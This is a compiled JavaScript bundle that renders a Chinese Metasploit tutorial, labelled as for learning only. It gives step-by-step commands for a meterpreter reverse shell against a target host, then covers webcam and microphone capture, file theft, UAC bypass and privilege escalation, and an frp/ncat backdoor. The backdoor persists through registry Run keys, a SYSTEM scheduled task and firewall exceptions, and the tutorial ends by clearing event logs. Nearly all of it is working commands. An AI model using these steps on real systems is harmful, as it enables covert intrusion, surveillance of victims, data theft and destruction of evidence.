{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[53],{614:function(s,a,t){\"use strict\";t.r(a);var n=t(10),e=Object(n.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":s.$parent.slotKey}},[t(\"blockquote\",[t(\"p\",[s._v(\"仅用于交流学习\")])]),s._v(\" \"),t(\"h2\",{attrs:{id:\"_0x00-准备工作\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_0x00-准备工作\"}},[s._v(\"#\")]),s._v(\" \"),t(\"strong\",[s._v(\"0x00 准备工作\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"具有公网ip的服务器且已安装MSF(监听者)：1.2.3.4\")]),s._v(\" \"),t(\"li\",[s._v(\"目标主机(受害者)：192.168.2.111\")]),s._v(\" \"),t(\"li\",[s._v(\"本地kali机(攻击者)：192.168.34.23\")])]),s._v(\" \"),t(\"h2\",{attrs:{id:\"_0x01-服务器msf开启监听\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_0x01-服务器msf开启监听\"}},[s._v(\"#\")]),s._v(\" \"),t(\"strong\",[s._v(\"0x01 服务器MSF开启监听\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[t(\"code\",[s._v(\"use exploit/multi/handler\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" payload windows/x64/meterpreter/reverse_tcp \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 或者试下 set payload windows/meterpreter/reverse_tcp\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" lhost \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"0.0\")]),s._v(\".0.0\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" lport \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1111\")]),s._v(\"\\nexploit\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\")])]),t(\"h2\",{attrs:{id:\"_0x02-本地kali机执行攻击\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_0x02-本地kali机执行攻击\"}},[s._v(\"#\")]),s._v(\" \"),t(\"strong\",[s._v(\"0x02 本地kali机执行攻击\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" rhost \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"192.168\")]),s._v(\".2.111\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" lhost \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1.2\")]),s._v(\".3.4\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" lport \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1111\")]),s._v(\"\\nexploit\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\")])]),t(\"h2\",{attrs:{id:\"_0x03-后渗透测试命令\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_0x03-后渗透测试命令\"}},[s._v(\"#\")]),s._v(\" \"),t(\"strong\",[s._v(\"0x03 后渗透测试命令\")])]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"基本系统命令\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[t(\"code\",[s._v(\"sessions\\nsessions -i \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")]),s._v(\"id值\"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")])]),s._v(\"      \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 进入会话\")]),s._v(\"\\nsessions -k \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")]),s._v(\"id值\"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")])]),s._v(\"      \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 杀死会话\")]),s._v(\"\\nbackground              \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 将当前会话放置后台\")]),s._v(\"\\ngetuid                  \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看权限\")]),s._v(\"\\nsysinfo                 \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看系统信息\")]),s._v(\"\\nshell                   \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 进入目标及cmd shell\")]),s._v(\"\\nchcp \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"65001\")]),s._v(\"              \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 进入shell运行此命令可解决乱码问题\")]),s._v(\"\\nchcp \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"65001\")]),s._v(\" 就是换成UTF-8代码页 \\nchcp \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"936\")]),s._v(\" 可以换回默认的GBK \\nchcp \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"437\")]),s._v(\" 是美国英语 \\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"进程迁移，可防止\"),t(\"code\",[s._v(\"Meterpreter session Died\")])])]),s._v(\" \"),t(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[t(\"code\",[s._v(\"getpid                  \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 获取当前进程pid\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"ps\")]),s._v(\"                      \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看当前活跃进程\")]),s._v(\"\\nmigrate \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")]),s._v(\"pid值\"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")])]),s._v(\"         \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 将Meterpreter session 移植到指定pid值进程中\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"kill\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")]),s._v(\"pid值\"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")])]),s._v(\"            \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 杀死进程\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" autorunscript migrate -n explorer.exe   \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 自动化迁移进程\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"3\"}},[t(\"li\",[s._v(\"摄像头和麦克风命令\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[t(\"code\",[s._v(\"webcam_list             \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看摄像头\")]),s._v(\"\\nwebcam_snap             \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 拍照\")]),s._v(\"\\nwebcam_stream           \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 开启视频\")]),s._v(\"\\nrecord_mic              \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 此命令默认录制默认麦克风录制1秒钟的音频\")]),s._v(\"\\n-d ：记录的秒数，默认为1秒\\n-F ：wav文件路径。默认为\"),t(\"span\",{pre:!0,attrs:{class:\"token environment constant\"}},[s._v(\"HOME\")]),s._v(\" / \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"随机乱码名字\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" .wav\\n-p ：自动播放捕获的音频，默认为“true”。\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"4\"}},[t(\"li\",[s._v(\"文件系统命令\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[t(\"code\",[s._v(\"getwd                   \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看当前目录\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"pwd\")]),s._v(\"                     \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看当前目录\")]),s._v(\"\\nupload /root/1.txt \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v(\"'C:\\\\users\\\\'\")]),s._v(\"                          \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 上传文件(夹)到目标主机\")]),s._v(\"\\ndownload \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v(\"'C:\\\\Users\\\\Administrator\\\\Documents\\\\'\")]),s._v(\" /home/     \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 下载文件(夹)到本地\")]),s._v(\"\\ngetlwd                                                  \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 操作攻击者主机, 查看当前目录\")]),s._v(\"\\nlpwd                                                    \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 同上\")]),s._v(\"\\nlcd                                                     \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 操作攻击者主机, 切换目录\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"5\"}},[t(\"li\",[s._v(\"提权，有时候尝试换个端口，可能收获意外\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[t(\"code\",[s._v(\"getsystem      \\n\\n获得 meterpreter 后，运行\\nbackground\\nuse exploit/windows/local/bypassuac\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" session \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" lhost \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"49.235\")]),s._v(\".146.183 \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 不需要\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" lport \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"2363\")]),s._v(\"           \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 不需要\")]),s._v(\"\\nexploit\\n\\n若再次获得 meterpreter ，yunx\\n\\ngetuid\\ngetsystem\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"6\"}},[t(\"li\",[s._v(\"后门（利用frp穿透）\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"思路：上传 frpc和ncat相关文件到目标主机, 编写vbs脚本，添加注册表，放行相关端口，放行软件\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[t(\"code\",[s._v(\"upload /home/backdoor C:\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Users\\nshell\\nmove  C:\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Users\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"backdoor\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"one.bat C:\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Windows\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"System32\\ncall firewall.bat\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"rmdir\")]),s._v(\" C:\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Users\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"backdoor\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\")])]),t(\"div\",{staticClass:\"language-powershell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-powershell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"### 以下命令被firewall脚本代替\")]),s._v(\"\\nreg add \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"')]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"v geniuslib \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"t REG_SZ \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"d \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"dynamiclib.vbs\"')]),s._v(\"\\nreg add \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\"')]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"v geniuslib \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"t REG_SZ \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"d \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"dynamiclib.vbs\"')]),s._v(\"\\nreg add \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices\"')]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"v geniuslib \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"t REG_SZ \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"d \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"dynamiclib.vbs\"')]),s._v(\"\\nreg add \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce\"')]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"v geniuslib \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"t REG_SZ \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"d \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"dynamiclib.vbs\"')]),s._v(\"\\n\\nschtasks\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\".\")]),s._v(\"exe \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"create \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"tn \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"init\"')]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"ru SYSTEM \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sc\")]),s._v(\" ONSTART \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"tr \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"C:\\\\test\\\\init.bat\"')]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\")])]),t(\"p\",[s._v(\"若开启防火墙\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-powershell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-powershell\"}},[t(\"code\",[s._v(\"netsh advfirewall firewall add rule name = vhosts \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"dir\")]),s._v(\" = in protocol = tcp action = allow localport = 12322 remoteip = localsubnet profile = DOMAIN  \\nnetsh advfirewall firewall \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"set\")]),s._v(\" allowedprogram vhosts\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\".\")]),s._v(\"exe A ENABLE \\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"注释\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#注释\"}},[s._v(\"#\")]),s._v(\" 注释\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[t(\"code\",[s._v(\"netsh advfirewall show allowedprogram\\n\\nrun metsvc                      \"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 将会在目标主机上以 Meterpreter 的服务的形式注册在服务列表中，并开机自动自动\")]),s._v(\"\\nrun metsvc -r 卸载目标主机上的 Meterpreter 服务\\n\\nrun persistence -U -i \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"10\")]),s._v(\" -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"4444\")]),s._v(\" -r \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"192.168\")]),s._v(\".43.100\\n\\n-P：设置Payload，默认为windows/meterpreter/reverse_tcp。该默认的payload生成的后门为32位程序。因此，当目标机器为64位系统时，留下的后门将无法运行；\\n\\n-U：设置后门在用户登录后自启动。该方式会在HKCU\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Software\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Microsoft\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Windows\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"CurrentVersion\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Run下添加注册表信息。推荐使用该参数；\\n\\n-X：设置后门在系统启动后自启动。该方式会在HKLM\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Software\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Microsoft\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Windows\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"CurrentVersion\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Run下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。因此，在非管理员权限或者未进行BypassUAC操作情况下，不推荐使用该参数；\\n\\n-i：设置反向连接间隔时间，单位为秒。当设置该参数后，目标机器会每隔设置的时间回连一次所设置的ip；\\n\\n-p：设置反向连接的端口号。即黑阔用来等待连接的端口；\\n\\n-r：设置反向连接的ip地址。即黑阔用来等待连接的ip；\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"7\"}},[t(\"li\",[s._v(\"清除日志\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-powershell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-powershell\"}},[t(\"code\",[s._v(\"clearev\\n\")])]),s._v(\" 